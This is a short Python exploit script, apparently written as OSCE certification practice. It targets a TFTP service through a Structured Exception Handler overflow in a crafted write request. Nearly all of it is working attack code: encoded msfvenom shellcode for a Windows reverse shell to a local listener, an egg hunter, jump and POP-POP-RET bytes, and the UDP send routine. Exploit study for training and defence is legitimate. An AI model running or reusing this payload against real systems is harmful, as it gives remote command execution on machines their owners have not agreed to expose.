#!/usr/bin/env python3

# Tyler Boykin
# Time trials for OSCE: ~10 hours-ish
# Exploit-db entry:     https://www.exploit-db.com/exploits/40138


import socket

buf_pre = "\x54\x58\x80\xC4\xF4\x48\x50\x5C\x83\xC7\x0b"

# There were some badchars, but I was too lazy to hunt for them individually, so I used alpha_mixed.
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.65 LPORT=123 -f raw -e x86/alpha_mixed BufferRegister=EDI
buf = "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIIlM8k25Pc0Wp50k9Yup1O0QtLKv0P0NkRrDLNksb6tnkt2WX4OX70JEvp1KOnL5lSQSLwr4l7PiQzoDMfaxGhbXrcbF7nkRrb0LKpJ7LnkPLR1SHisW8Wq8Q2qNkSiWP5QICnkCyfxys4zCynk6TnkvaIFfQIoNLZaXOFmgqxGVXip2UL6Vc1mih7KcM5taeJD3hNk0X6D7q9CcVnktL2knkaHglfan3Nkgtnkc1xPNi3t14Et1KSksQ1IqJRq9okP3oSoqJnkdRZKLM1M3X7CWBEPuPsX0wcCEb3oPTBHRl3G7Vww9oiEmhJ0gquP305yyT1DV0u8TiMPrKuPKOkebpF0PPbpSpv0Sp60axkZvokokPioxUOgpj6e58YP98uQSqbHdBs0C0qklIM6Qz6p2vRwrHnyOUQdE1KOxUMUO02TDL9o0NGxbUHlcXHpLuoRbvioiEbHBCRMRDs0mYjCv7sgpWeaKF1zDRF9QFKR9mPfXGbd6DGL5QeQNmCtetB0YVC074Rtbp1F1F66PFPV2nrvbvV3rvQxaizl7Ok6kOyEK9m0pNRvqV9oDpe8c8NggmSPIoHUOKzPx5LbBv58nFOeOMom9oyE5lUVsLvjK0YkYpD5tEmkg76s2R2OBJWpF3KOIEAA"

# Egg hunter: w00t
hunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
RHOST="192.168.1.79"
RPORT=69

payload = ""
payload += "\x00\x01" #__WRQ
#Size: 1492
payload += "w00tw00t"
payload += buf_pre
payload += buf
payload += 'A' * (1492 - len(buf) - 99 - 8 - 2 - 11)
payload += "\x90\x90"
payload += hunter
payload += "\x42" * (99 - len(hunter))
payload += "\x48\x48\x77\x04"       #__SMOL JMP
payload += "\x53\xc2\xa7\x71"       #__POP_POP_RET
payload += "\x5c"
payload += "\x54"
payload += "\x58"
payload += "\x04\x1d"
payload += "\x50"
payload += "\x5c"
payload += "\x05\x49\x46\x50\x7F"
payload += "\x05\x07\x02\x04\x01"
payload += "\x50"
## Size: 600
payload += 'B' * (600)
payload += "\x00"
payload += "netascii"
payload += "\x00"

sockfd = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sockfd.sendto(payload.encode("latin1"),(RHOST,RPORT))
sockfd.close()
